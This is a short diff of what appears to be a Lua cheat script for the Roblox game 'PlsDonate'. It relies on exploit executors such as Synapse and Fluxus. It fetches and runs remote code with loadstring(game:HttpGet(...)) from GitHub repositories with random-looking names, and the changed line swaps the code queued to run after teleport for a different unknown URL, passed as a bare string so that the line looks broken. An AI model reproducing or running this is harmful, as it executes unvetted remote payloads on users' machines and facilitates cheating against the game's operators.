@@ -85,7 +85,7 @@ local booths = {
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local httpservice = game:GetService('HttpService')
-queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/old.lua'))()")
+queueonteleport('https://raw.githubusercontent.com/TpaBaBpyKe/Nai23hiVgF4hSS/main/NBDFjsd72.lua')
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/TpaBaBpyKe/yessir/main/NAbd734BS6S.lua"))()
 local function claimGifts()
 	pcall(function()
